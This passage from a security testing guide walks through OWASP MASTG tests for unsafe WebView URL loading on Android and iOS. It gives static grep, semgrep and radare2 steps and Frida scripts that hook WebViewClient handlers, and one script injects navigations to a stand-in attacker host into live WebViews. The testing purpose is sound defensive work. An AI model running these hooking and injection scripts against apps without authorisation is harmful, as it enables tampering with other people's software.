So in an app that uses app-bound domains properly, an attacker who gets a link into the WebView can at worst trigger a navigation failure, and a WebView that does reach an attacker page cannot be scripted by or talk to the native side. Apps with the managed `com.apple.developer.web-browser` entitlement (default-browser apps) are exempt. When you find `WKAppBoundDomains` in an app, check every entry: one domain that hosts user content or an open redirect undoes the protection, and the top-frame-only check means iframes need separate review.

#### Third-party content: SFSafariViewController and ASWebAuthenticationSession

For links to sites the app does not own, `SFSafariViewController` is the right tool: the user sees the real URL, Safari's protections apply, and the app cannot read the page or inject script. App Review requires that it is not hidden or obscured. For sign-in to a third-party identity provider, `ASWebAuthenticationSession` gives the user Safari's credentials and keeps the password away from the app; on iOS 17.4 and later it can complete with an `https` callback bound to the app's associated domain (`ASWebAuthenticationSession.Callback.https(host:path:)`) instead of a custom scheme that another app could also register. A `WKWebView` login page for a third-party provider is a finding in its own right, because the app can read the password.

## Tests

OWASP links five tests to MASWE-0035, and all five are documented here: three Android tests (two static, one dynamic) and two iOS static tests. The Android ones sit in OWASP's MASVS-CODE folder, but their `maswe` field is MASWE-0035. They replace these legacy (MASTG v1) tests:

| Legacy test | Replaced by |
|---|---|
| [MASTG-TEST-0027](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0027/) Testing for URL Loading in WebViews (Android) | MASTG-TEST-0398, 0399, 0400 |
| [MASTG-TEST-0076](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/) Testing iOS WebViews | MASTG-TEST-0331, 0332, and 0333 (file access, in the [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/)) |

There is a gap between the two platforms. iOS has a test for attacker-controlled URLs reaching the load APIs (0332) but no test for the navigation delegate; Android has tests for the navigation callbacks (0398, 0400) but none for `loadUrl` with external input. We close it in two places: the review checklists in 0398 and 0332 cover both halves on each platform, and [GT-0035-1](#gt-0035-1-driving-every-webview-load-input-with-an-attacker-url-android-and-ios) proves them at runtime by feeding every input that reaches a load API with an attacker URL.

### Before you start: map the WebViews and their inputs

One pass gives you the candidates for all the tests below.

```bash
# Android: decompile, then list WebView sinks, navigation callbacks and Safe Browsing settings
jadx -d out base.apk
apktool d base.apk -o apk_out
grep -rnE '\.(loadUrl|postUrl|loadData|loadDataWithBaseURL|evaluateJavascript)\(' out/sources/ \
  | grep -vE '^out/sources/(androidx|kotlin|kotlinx)/' > wv-sinks.txt
grep -rnE 'extends WebViewClient|extends WebViewClientCompat|setWebViewClient\(|shouldOverrideUrlLoading|shouldInterceptRequest|onCreateWindow|setSupportMultipleWindows' \
  out/sources/ | grep -vE '^out/sources/(androidx|kotlin|kotlinx)/' > wv-nav.txt
grep -rnE 'setSafeBrowsingEnabled|setSafeBrowsingWhitelist|setSafeBrowsingAllowlist|onSafeBrowsingHit' out/sources/ > wv-sb.txt
grep -n 'EnableSafeBrowsing' -A1 apk_out/AndroidManifest.xml
wc -l wv-*.txt
```

```bash
# iOS: decrypted IPA; every Mach-O, then WebView classes and selectors in each
unzip -q App.ipa -d ipa
find ipa/Payload/App.app -type f | while read -r f; do file "$f" | grep -q 'Mach-O' && echo "$f"; done > macho.txt
while read -r b; do
  echo "== $b"
  rabin2 -zz "$b" 2>/dev/null | grep -oE 'UIWebView|loadRequest:|loadHTMLString:baseURL:|loadFileURL:allowingReadAccessToURL:|loadData:MIMEType:characterEncodingName:baseURL:|loadFileRequest:allowingReadAccessToURL:|loadSimulatedRequest:[A-Za-z:]*|decidePolicyForNavigationAction:[A-Za-z:]*|limitsNavigationsToAppBoundDomains|SFSafariViewController|ASWebAuthenticationSession' | sort | uniq -c
done < macho.txt
plutil -p ipa/Payload/App.app/Info.plist | grep -A12 -E 'WKAppBoundDomains|CFBundleURLTypes|NSAppTransportSecurity'
```

For each WebView, note which screen hosts it, what it loads, whether JavaScript and bridges are on (from the [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/) and [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) reviews), and which inputs can reach its load call. That table is what you rate against at the end.

### MASTG-TEST-0398: References to WebViewClient URL Loading Handlers (Android)

Source: [MASTG-TEST-0398](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0398/). Platform: Android. Type: static (code) with manual review. Related knowledge: MASTG-KNOW-0018.

#### Overview

The test finds every `WebViewClient` the app installs and every override of `shouldOverrideUrlLoading` and `shouldInterceptRequest`, then reviews whether they restrict navigation to trusted content. The three outcomes OWASP names are: no validation, weak validation (substring checks and similar), and a client installed with no interception method at all, which turns the safe default (links go to the browser) into "everything loads in the WebView". As OWASP stresses, a `WebViewClient` is not a finding in itself; the decision logic is.

We extend the review to the paths that the callbacks cannot see, because a reviewer who only reads `shouldOverrideUrlLoading` misses them: `loadUrl()` and `postUrl()` calls from external input, `onCreateWindow`, and `intent:` handling.

#### Prerequisites

- The APK, decompiled with jadx and decoded with apktool ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/)).
- semgrep ([MASTG-TOOL-0110](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/)) with OWASP's `mastg-android-webview-url-handlers.yml` rule, or the grep from the start of this section ([MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)).
- jadx-gui for reviewing the decompiled code ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)).

#### Steps

1. **Locate the clients and handlers.** Run the OWASP rule over the decompiled sources:

   ```bash
   semgrep -c mastg-android-webview-url-handlers.yml --max-lines-per-finding 40 out/sources/
   ```

   The rule `mastg-android-webviewclient-url-handlers` matches classes extending `WebViewClient` that declare either handler, direct calls to the handlers, and every `setWebViewClient(...)` call; a second rule in the same file, `mastg-android-webviewclient-safebrowsing-whitelist`, flags `setSafeBrowsingWhitelist` and `onSafeBrowsingHit` (used in MASTG-TEST-0399). Like most OWASP rules it is a locator: it reports where to look, not whether the code is safe. It also misses Kotlin anonymous objects that jadx emits as named inner classes extending `WebViewClientCompat`, so keep the grep results as well.

2. **For every `setWebViewClient(...)`, identify the class passed in** and open it. `new WebViewClient()` with no overrides, or a subclass that only overrides `onPageFinished` / `onReceivedError`, means every navigation stays inside the WebView. Record that against the WebView and what it loads.

3. **Review each `shouldOverrideUrlLoading`** (both overloads) against this checklist:
   - Does it parse the URL (`request.getUrl()` / `Uri.parse(url)`) and compare `getScheme()` to `https` and `getHost()` for **equality** against a fixed set, or with a correct `"." + domain` suffix? Any `contains`, `startsWith`, `endsWith` without the dot, `matches()` with an unanchored regex, or `indexOf` on the full URL string is weak validation.
   - What happens when `getHost()` is `null` (`javascript:`, `intent:`, `data:`, `mailto:`)? It must block, not fall through to `return false`.
   - Is the fallback at the end `return true` (block) or `return false` (load)? Default-allow with a denylist is weak by construction.
   - Does it check `view.getUrl()` instead of the requested URL?
   - Does it ignore `isForMainFrame()` or `isRedirect()` in a way that lets iframes or redirects through?
   - If `minSdkVersion` < 24, do both overloads exist with the same logic?
   - Does it handle `intent:` by calling `Intent.parseUri(...)` and `startActivity(...)`? If so, does it add `CATEGORY_BROWSABLE` and clear the component and selector? If not, a page can start the app's non-exported activities (see [MASWE-0032](/mobile/maswe-0032-insecure-intents/)).
   - Does it call `view.loadUrl(...)` itself after modifying the URL (for example adding a token parameter)?

4. **Review `shouldInterceptRequest`** for what it is used for. If it is meant to block third-party resources, check the host logic the same way; remember it is not called for redirect targets, `javascript:`, `blob:` or `android_asset` URLs. If it serves local content, that belongs to the [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) review.

5. **Check new windows.** If `setSupportMultipleWindows(true)` is set, open the `WebChromeClient.onCreateWindow` implementation and see which `WebViewClient` the new WebView gets.

6. **Follow the loads that bypass the callbacks.** For each line in `wv-sinks.txt`, trace the argument back (jadx-gui *Find Usage* / *Go to declaration*) to its source: `getIntent().getStringExtra(...)`, `getIntent().getData()`, `Uri.getQueryParameter(...)`, `onNewIntent`, `RemoteMessage.getData()`, a remote-config getter, a JSON field from an API response. If you want semgrep to do the first pass, a taint rule along these lines works on jadx output:

   ```yaml
   rules:
     - id: gt-webview-load-from-external-input
       mode: taint
       languages: [java]
       severity: WARNING
       message: External input reaches a WebView load API
       pattern-sources:
         - pattern: (Intent $I).getStringExtra(...)
         - pattern: (Intent $I).getData()
         - pattern: (Uri $U).getQueryParameter(...)
         - pattern: (Bundle $B).getString(...)
       pattern-sinks:
         - pattern: (WebView $W).loadUrl(...)
         - pattern: (WebView $W).postUrl(...)
         - pattern: (WebView $W).loadDataWithBaseURL(...)
         - pattern: (WebView $W).evaluateJavascript(...)
   ```

   Then check whether the value is validated before the call, and whether `loadUrl` passes extra headers (`Authorization`, API keys) or appends tokens to the URL.

7. **Check whether the inputs are reachable**: the activity is exported or has an intent filter ([MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/), [MASWE-0029](/mobile/maswe-0029-insecure-deep-links/)), the push or config path exists in the release build. Confirm dynamically with MASTG-TEST-0400 and GT-0035-1.

#### Observation

For each WebView: the `WebViewClient` class it uses, the decompiled body of each URL-loading handler, your classification against the checklist, the `onCreateWindow` behaviour, and the list of `loadUrl`/`postUrl`/`loadData*` calls with the source of their argument.

#### Evaluation

The test **fails** if, for a WebView that can render content with JavaScript or has cookies, bridges or file access worth having:

- a `WebViewClient` is installed and no handler restricts navigation (no override, or an override that always returns `false`);
- the handler's validation can be bypassed: substring or prefix checks, missing scheme check, `null` host falling through to "allow", default-allow denylists, validation of `view.getUrl()`, an unvalidated subframe or redirect path, or diverging overloads on supported OS versions;
- `intent:` URLs are parsed and started without the browsable restrictions;
- `onCreateWindow` gives new windows an unrestricted client; or
- a `loadUrl`, `postUrl` or `loadData*` call takes external input without validating it (our extension; the OWASP test does not cover it).

It **passes** if navigation is either left to the default (no `WebViewClient`), or restricted by a handler that parses the URL, requires `https`, compares hosts exactly or with a correct suffix check, blocks everything else (handing ordinary web links to the browser), and every load from external input goes through the same check. A WebView that only ever displays bundled, link-free content with JavaScript disabled is an observation, not a failure, even with an unrestricted client.

#### Demo

[MASTG-DEMO-0157](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0157/MASTG-DEMO-0157/). The sample enables JavaScript and installs a client whose handlers log and allow everything:

```kotlin
webView.settings.javaScriptEnabled = true
webView.webViewClient = object : WebViewClient() {
    override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
        Log.d("MastgTest", "Loading URL: ${request?.url}")
        return false                      // no host or scheme check: every URL loads here
    }
    override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
        Log.d("MastgTest", "Intercepting request: ${request?.url}")
        return super.shouldInterceptRequest(view, request)
    }
}
webView.loadUrl("https://mas.owasp.org/")
```

semgrep on the jadx output reports the `setWebViewClient` call and the anonymous client that spans both handlers:

```text
MastgTestWebView_reversed.java
 ❱ rules.mastg-android-webviewclient-url-handlers
      [MASVS-CODE-4] Detected WebViewClient URL interception method.
       30┆ webView.setWebViewClient(new WebViewClient() { // from class: ...MastgTestWebView.mastgTest.2
       31┆     @Override // android.webkit.WebViewClient
       32┆     public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
       ...
       36┆         return false;
```

Reading the reported code shows that neither handler calls `getHost()`, `getScheme()` or `getPath()` or compares the URL to anything; they only call `toString()` for logging. The WebView therefore loads any URL a link, script or redirect sends it to, inside the app, with JavaScript on. The test fails.

### MASTG-TEST-0399: SafeBrowsing Disabled (Android)

Source: [MASTG-TEST-0399](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0399/). Platform: Android. Type: static (config and code). Related knowledge: MASTG-KNOW-0018. Applies from API 27 per OWASP; the switches themselves exist from API 26.

#### Overview

The test checks whether the app turns Safe Browsing off, either for all WebViews with the `android.webkit.WebView.EnableSafeBrowsing` manifest meta-data set to `false`, or per WebView with `WebSettings.setSafeBrowsingEnabled(false)`. Because the code setting takes precedence over the manifest, you have to check both: a manifest that says `true` does not tell you the WebViews are protected. We also look at the two ways to neutralise Safe Browsing without switching it off, `onSafeBrowsingHit` handlers that proceed and broad allowlists, since they have the same effect.

#### Prerequisites

- The APK decoded with apktool, so the manifest is readable ([MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/), [MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/)), and decompiled with jadx.
- semgrep with OWASP's `mastg-android-webview-safebrowsing.yml` rule.
- Optional, for confirmation: a device or emulator **with Google Play services** and Frida.

#### Steps

1. **Manifest.** Look for the meta-data and resolve its value; it can be a literal or a resource reference:

   ```bash
   grep -n -B1 -A2 'android.webkit.WebView.EnableSafeBrowsing' apk_out/AndroidManifest.xml
   # android:value="@bool/sb" -> look it up
   grep -rn 'name="sb"' apk_out/res/values*/bools.xml
   # Without apktool:
   aapt dump xmltree base.apk AndroidManifest.xml | grep -A2 EnableSafeBrowsing
   ```

   Remember that libraries can contribute meta-data through manifest merging, so read the merged manifest from the APK, not the source tree.

2. **Code.** Run the OWASP rule over the decoded manifest and the decompiled code, and grep for the AndroidX and response APIs it does not cover:

   ```bash
   semgrep -c mastg-android-webview-safebrowsing.yml apk_out/AndroidManifest.xml out/sources/
   grep -rnE 'setSafeBrowsingEnabled\(|WebSettingsCompat\.setSafeBrowsingEnabled|setSafeBrowsingWhitelist|setSafeBrowsingAllowlist|onSafeBrowsingHit|\.proceed\((true|false)\)' out/sources/
   ```

   The rule `mastg-android-webview-safebrowsing-disabled-code` matches `$WEBSETTINGS.setSafeBrowsingEnabled(false)` only. A call with a variable (`setSafeBrowsingEnabled(remoteConfig.sb)`) needs manual tracing.

3. **Review each `onSafeBrowsingHit`.** `callback.backToSafety(true)` and `showInterstitial(true)` are fine. `callback.proceed(...)` on every hit, or on a threat-type condition that covers phishing, is Safe Browsing disabled in all but name.

4. **Review allowlists.** Entries passed to `setSafeBrowsingWhitelist` / `setSafeBrowsingAllowlist` are exempt from checks, and a bare `example.com` rule also matches subdomains. An entry for the app's own domain is normal; an entry for a domain the app does not control, or a list built from server data, is not.

5. **Confirm at runtime (optional).** Read the effective setting of every live WebView and load Google's test URL in it. WebView methods must run on the UI thread:

   ```javascript
   // sb-check.js
   Java.perform(() => {
     Java.choose('android.webkit.WebView', {
       onMatch(wv) {
         Java.scheduleOnMainThread(() => {
           console.log(`[WebView] ${wv.getUrl()} safeBrowsing=${wv.getSettings().getSafeBrowsingEnabled()}`);
           wv.loadUrl('chrome://safe-browsing/match?type=phishing');
         });
       },
       onComplete() {}
     });
   });
   ```

   ```bash
   frida -U -n 'Example App' -l sb-check.js      # run while the WebView screen is open
   ```

   With Safe Browsing active you get the red interstitial (or the app's `onSafeBrowsingHit` behaviour); with it disabled the WebView shows an error page or nothing. Navigate back to restore the app's state afterwards.

#### Observation

The manifest meta-data and its resolved value; every `setSafeBrowsingEnabled` call with its argument; every `onSafeBrowsingHit` implementation and allowlist call; and, if you ran it, the runtime value per WebView and the result of loading the test URL.

#### Evaluation

The test **fails** if the merged manifest sets `android.webkit.WebView.EnableSafeBrowsing` to `false` (and no code re-enables it for the WebViews in question), or if any WebView that loads remote content has `setSafeBrowsingEnabled(false)`, regardless of the manifest. We also fail it when an `onSafeBrowsingHit` handler proceeds on phishing or malware hits without showing the interstitial, or when the allowlist exempts domains the app does not control. It **passes** when neither switch disables it, any handler goes back to safety or shows the interstitial, and allowlists only name the app's own domains. Results on a device without Google Play services do not count either way.

#### Demo

[MASTG-DEMO-0156](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0156/MASTG-DEMO-0156/). The manifest explicitly enables Safe Browsing, but the code switches it off for the WebView:

```xml
<meta-data android:name="android.webkit.WebView.EnableSafeBrowsing"
           android:value="true" />
```

```kotlin
webView.apply {
    settings.safeBrowsingEnabled = false          // wins over the manifest
    webViewClient = object : WebViewClient() {
        override fun onSafeBrowsingHit(view: WebView, request: WebResourceRequest,
                                       threatType: Int, callback: SafeBrowsingResponse) {
            callback.backToSafety(true)
        }
    }
    loadUrl("chrome://safe-browsing/match?type=phishing")
}
```

semgrep reports only the code finding, because the manifest is compliant:

```text
MastgTestWebView_reversed.java
❯❱ rules.mastg-android-webview-safebrowsing-disabled-code
      [MASVS-CODE-4] SafeBrowsing is disabled for WebViews in code via setSafeBrowsingEnabled(false). ...
       26┆ webView.getSettings().setSafeBrowsingEnabled(false);
```

The test fails. With the call removed, the same app logs the hit from its `onSafeBrowsingHit` handler (`Blocked URL, chrome://safe-browsing/match?type=phishing, threatType, 2`; 2 is `SAFE_BROWSING_THREAT_PHISHING`) and returns to safety.

### MASTG-TEST-0400: Runtime Use of WebViewClient URL Loading Handlers (Android)

Source: [MASTG-TEST-0400](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0400/). Platform: Android. Type: dynamic (hooks) with manual review. Related knowledge: MASTG-KNOW-0018. Complements MASTG-TEST-0398.

#### Overview

The test hooks the URL-loading handlers at runtime to see which URLs reach them, what they return, and whether they inspect the URL's host, scheme or path while deciding. It gives you evidence for obfuscated apps where reading the handler is slow, and it shows which WebViews and clients are actually live.

OWASP's demo script hooks the handlers on the **base class** `android.webkit.WebViewClient`. That only fires when the app's subclass calls `super`, or does not override the method at all. An app whose `shouldOverrideUrlLoading` does its own thing and never calls `super` (the normal case, and the demo's own case) is invisible to that hook. That is why the published demo output only shows `shouldInterceptRequest` lines (the demo calls `super` there) and none for `shouldOverrideUrlLoading`, and why its "no URL inspection" result only covers the time spent inside `super`. The script below hooks the **concrete client class** the app registers instead, which fixes both problems. It also hooks the `Uri` accessors on the concrete `Uri` implementation classes, because `android.net.Uri` itself only declares them as abstract methods.

#### Prerequisites

- A rooted device or emulator with frida-server ([MASTG-TOOL-0001](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0001/)) and the app installed ([MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/)); method hooking as in [MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/).
- The list of WebViews and clients from MASTG-TEST-0398.
- A test account and the attacker URL set from GT-0035-1.

#### Steps

1. **Save the hook script.** It logs every client registered, hooks the handlers that client declares, and records `Uri` inspection calls made while a handler runs:

   ```javascript
   // wvc-trace.js
   Java.perform(() => {
     const WebView = Java.use('android.webkit.WebView');
     const Log = Java.use('android.util.Log');
     const Exception = Java.use('java.lang.Exception');
     const active = {};      // thread id -> list of Uri accessors called inside a handler
     const hooked = new Set();

     // android.net.Uri is abstract: hook the accessors where the concrete classes declare them
     const accessors = ['getHost', 'getScheme', 'getPath', 'getAuthority', 'getUserInfo'];
     ['android.net.Uri$StringUri', 'android.net.Uri$HierarchicalUri',
      'android.net.Uri$AbstractHierarchicalUri', 'android.net.Uri$OpaqueUri'].forEach(cn => {
       let K;
       try { K = Java.use(cn); } catch (e) { return; }
       const own = new Set();
       const ms = K.class.getDeclaredMethods();
       for (let i = 0; i < ms.length; i++) own.add(ms[i].getName());
       accessors.filter(a => own.has(a)).forEach(a => {
         K[a].implementation = function () {
           const t = Process.getCurrentThreadId();
           if (active[t]) active[t].push(a);
           return this[a]();
         };
       });
     });

     function hookClient(cls) {
       if (hooked.has(cls)) return;
       hooked.add(cls);
       const C = Java.use(cls);
       const declared = C.class.getDeclaredMethods();
       const names = new Set();
       for (let i = 0; i < declared.length; i++) names.add(declared[i].getName());
       ['shouldOverrideUrlLoading', 'shouldInterceptRequest'].forEach(m => {
         if (!names.has(m)) { console.log(`    ${m}: not overridden`); return; }
         C[m].overloads.forEach(o => {
           o.implementation = function (view, req) {
             const t = Process.getCurrentThreadId();
             active[t] = [];
             const r = o.apply(this, arguments);
             const seen = active[t]; delete active[t];
             let url = req, meta = '';
             if (req !== null && typeof req !== 'string') {
               url = req.getUrl().toString();
               meta = ` mainFrame=${req.isForMainFrame()} redirect=${req.isRedirect()} gesture=${req.hasGesture()} method=${req.getMethod()}`;
             }
             const verdict = m === 'shouldOverrideUrlLoading'
               ? (r ? 'true (blocked/handled by app)' : 'false (loaded in WebView)')
               : (r === null ? 'null (loaded normally)' : 'custom response');
             console.log(`\n[${cls.split('.').pop()}.${m}] ${url}${meta}\n    inspected: ${seen.length ? seen.join(',') : 'NONE'}\n    -> ${verdict}`);
             return r;
           };
         });
         console.log(`    ${m}: hooked`);
       });
     }

     WebView.setWebViewClient.implementation = function (client) {
       const cls = client === null ? 'null' : client.$className;
       console.log(`\n[setWebViewClient] ${cls}`);
       console.log(Log.getStackTraceString(Exception.$new()).split('\n').slice(1, 5).join('\n'));
       if (client !== null) hookClient(cls);
       return this.setWebViewClient(client);
     };
   });
   ```

2. **Spawn the app with the script** so that clients registered at start-up are caught:

   ```bash
   frida -U -f com.example.app -l wvc-trace.js -o wvc-trace.log
   ```

3. **Exercise every WebView**: open each screen from your map, tap links (including external ones such as social media, terms, help), submit forms, go back and forward.

4. **Drive navigations the app does not offer.** To test the allowlist itself, make the page navigate, which is exactly what attacker script or a malicious link would do. This injects a script-initiated navigation into every live WebView (no user gesture):

   ```javascript
   // nav-probe.js — run with: frida -U -n 'Example App' -l nav-probe.js
   const TARGET = 'https://example.com.attacker.example.net/probe.html';
   Java.perform(() => {
     Java.choose('android.webkit.WebView', {
       onMatch(wv) {
         Java.scheduleOnMainThread(() => wv.evaluateJavascript(`location.href=${JSON.stringify(TARGET)}`, null));
       },
       onComplete() {}
     });
   });
   ```

   Repeat with each bypass URL from the [allowlist pitfalls](#allowlist-pitfalls) table, plus a `target="_blank"` link and a POST form if the app supports multiple windows or forms. Run `wvc-trace.js` at the same time to see the handler's decision. If you can get content onto an allowed page (a comment, a profile field, an uploaded document), use that instead: it is the realistic attacker path.

5. **Review the backtraces** for any handler that returned `false` for an untrusted URL, and open the code location in jadx-gui ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)) to understand why.

#### Observation

The `setWebViewClient` calls with the concrete client classes and the stack that registered them, each URL that reached a handler with its main-frame/redirect/gesture flags, the `Uri` accessors called during the decision, the return value, and what the WebView displayed for each probe URL (screenshot: `adb exec-out screencap -p > probe-1.png`).

#### Evaluation

The test **fails** if a handler returns `false` (or `null` for `shouldInterceptRequest`, where it is used as a filter) for a URL on a host the app does not trust, so that the WebView loads it, or if a probe URL reaches the WebView without any handler being called (no client restriction, a new window with a different client, a POST). `inspected: NONE` for every call is strong evidence that no host or scheme check exists. Note that it does not prove a check exists when it shows `getHost`: a string `contains()` check never calls `Uri` accessors, and a `getHost()` followed by `endsWith("example.com")` still fails. Confirm the logic in code.

It **passes** if every untrusted probe URL is blocked (returns `true`, and is either dropped or opened in the browser) and every trusted one loads.

#### Demo

[MASTG-DEMO-0158](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0158/MASTG-DEMO-0158/) runs OWASP's script against the MASTG-DEMO-0157 app. The relevant published output:

```text
[*] setWebViewClient called
    WebViewClient implementation: org.owasp.mastestapp.MastgTestWebView$mastgTest$2
    [!] Overrides shouldInterceptRequest (custom URL handling)
    [!] Overrides shouldOverrideUrlLoading (custom URL handling)

[shouldInterceptRequest] URL: https://mas.owasp.org/
    URL inspection during handler: NONE (no host/scheme/path check -> no validation)
    -> default loading (no validation)
```

The app registers its own client that overrides both handlers, and the initial page request falls through to default loading without a host or scheme check. The test fails. With `wvc-trace.js` and a probe navigation to `https://example.com.attacker.example.net/probe.html`, the same app shows the missing half:

```text
[MastgTestWebView$mastgTest$2.shouldOverrideUrlLoading] https://example.com.attacker.example.net/probe.html mainFrame=true redirect=false gesture=false method=GET
    inspected: NONE
    -> false (loaded in WebView)
```

(The OWASP demo text also mentions requests to `fonts.googleapis.com` and `cdn.datatables.net` and a `shouldOverrideUrlLoading` result after tapping a link; neither appears in the published `output.txt`, and the base-class hook would not catch the latter. The illustrative output above is from our script.)

### MASTG-TEST-0331: Use of Deprecated WebView APIs (iOS)

Source: [MASTG-TEST-0331](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0331/). Platform: iOS. Type: static (code). Related knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0032. Relevant to apps that support iOS 12 or later, which today means every app.

#### Overview

The test looks for any reference to `UIWebView`. Compared with `WKWebView` it cannot disable JavaScript, gives `file:` content universal access by default, renders in the app's own process, and lacks modern protections such as full Content Security Policy support. Its only navigation control is `UIWebViewDelegate`'s `webView:shouldStartLoadWithRequest:navigationType:`. Since 2020 the App Store rejects binaries that reference it, so a hit usually means an enterprise or ad-hoc build, an app that has not been updated for years, or an SDK in a pre-release build that will fail submission anyway.

#### Prerequisites

- A decrypted IPA ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/) for exploring the package).
- radare2 ([MASTG-TOOL-0073](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/)) and rabin2 ([MASTG-TOOL-0129](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0129/)), or Xcode's `nm`/`otool` ([MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/)).

#### Steps

1. **Extract and list every Mach-O**, including frameworks and app extensions (see [Before you start](#before-you-start-map-the-webviews-and-their-inputs)). Check that the main binary is decrypted: `otool -l ipa/Payload/App.app/App | grep -A4 LC_ENCRYPTION_INFO` should show `cryptid 0`.

2. **Look for the class import in each binary.** A real use of the class needs the Objective-C class symbol, which shows up as an undefined (imported) symbol:

   ```bash
   while read -r b; do
     n=$(nm -u "$b" 2>/dev/null | grep -c '_OBJC_CLASS_\$_UIWebView')
     s=$(strings -a "$b" | grep -c 'UIWebView')
     [ "$n$s" != "00" ] && echo "$b  class-imports=$n  strings=$s"
   done < macho.txt
   ```

   A string hit without the class import is usually a runtime lookup such as `NSClassFromString(@"UIWebView")` or a log message. App Store Connect flags those too, but they are not the same as rendering content in a `UIWebView`.

3. **Find the code that uses it** with radare2, as in OWASP's demo: list flags matching the class, then cross-references to the class reference, then disassemble around each one:

   ```text
   e asm.bytes=false
   e scr.color=false
   ?e List all uses of the 'UIWebView' class:
   f~UIWebView
   ?e List all xrefs to the 'UIWebView' class:
   axt @ <address of reloc.UIWebView from the previous command>
   ?e Code snippet that contains the xref:
   pd 10 @ <xref address>
   ```

   ```bash
   r2 -q -i uiwebview.r2 -A ipa/Payload/App.app/App
   ```

   `-A` runs full analysis, which can take minutes on a large binary; for a quick answer, run `f~UIWebView` without `-A`, then analyse only the functions you need with `af @ <addr>`.

4. **Attribute each hit**: the app's own code, a framework in `Frameworks/` (name the SDK and version from its `Info.plist`), or a static library linked into the main binary (look at the symbol names around the xref).

5. **Optionally confirm at runtime** that a `UIWebView` is instantiated, by opening the suspected screen and listing live instances with Frida:

   ```javascript
   ObjC.choose(ObjC.classes.UIWebView, {
     onMatch(w) { console.log(`UIWebView ${w} request=${w.request()}`); },
     onComplete() { console.log('done'); }
   });
   ```

#### Observation

Per binary: whether it imports `_OBJC_CLASS_$_UIWebView`, the string hits, the functions with cross-references to the class, and what each one loads.

#### Evaluation

The test **fails** if any binary in the app uses `UIWebView`. We rate it by what it is used for: a `UIWebView` that renders remote or user-influenced content is a real exposure, while an unreachable reference in an SDK is a low-severity hygiene and release-blocking issue. It **passes** if there is no class import and no code reference to `UIWebView` in any binary.

#### Demo

[MASTG-DEMO-0094](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0094/MASTG-DEMO-0094/). The sample presents a `UIWebView`:

```swift
let webView = UIWebView()
webView.loadRequest(URLRequest(url: URL(string: "https://owasp.org")!))
let vc = UIViewController()
vc.view = webView
presenter.present(vc, animated: true, completion: {})
```

The radare2 script finds the class reference and the function that allocates it:

```text
List all uses of the UIWebView class:
0x100010108 8 reloc.UIWebView

List all xrefs to the 'UIWebView' class:
sym.MASTestApp.MastgTest.mastg.completion__1 0x100004514 [DATA:r--] ldr x0, reloc.UIWebView

Code snippet that contains the xref to 'UIWebView':
│  0x100004514      ldr x0, [x8, 0x108]          ; reloc.UIWebView
│  0x100004518      bl sym.imp.objc_allocWithZone
│  ...
│  0x100004530      add x8, x8, 0xc90            ; "https://owasp.org"
```

The completion closure allocates a `UIWebView` and loads a remote URL into it. The test fails.

### MASTG-TEST-0332: Attacker-Controlled URI in WebViews (iOS)

Source: [MASTG-TEST-0332](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0332/). Platform: iOS. Type: static (code) with manual review. Related knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0034.

#### Overview

The test finds every call to a `WKWebView` load API (`load(_:)`, `loadFileRequest(_:allowingReadAccessTo:)`, `loadFileURL(_:allowingReadAccessTo:)`, `loadHTMLString(_:baseURL:)`, `load(_:mimeType:characterEncodingName:baseURL:)`) and checks whether the URL or content passed to it can come from attacker-controlled input (a custom URL scheme parameter, a universal link component, user input, a server value) without validation. The consequences OWASP names are unintended navigation, XSS, and local file disclosure where file loads are involved. We add `loadSimulatedRequest` to the list of sinks and the navigation delegate to the review, because a delegate that allows everything turns any HTML injection into navigation to an attacker site.

#### Prerequisites

- A decrypted IPA and radare2 (as in MASTG-TEST-0331); for reviewing disassembly, [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/).
- The app's URL schemes and associated domains: `plutil -p Info.plist | grep -A8 CFBundleURLTypes` and the `com.apple.developer.associated-domains` entitlement (`codesign -d --entitlements - ipa/Payload/App.app` or `ldid -e`).
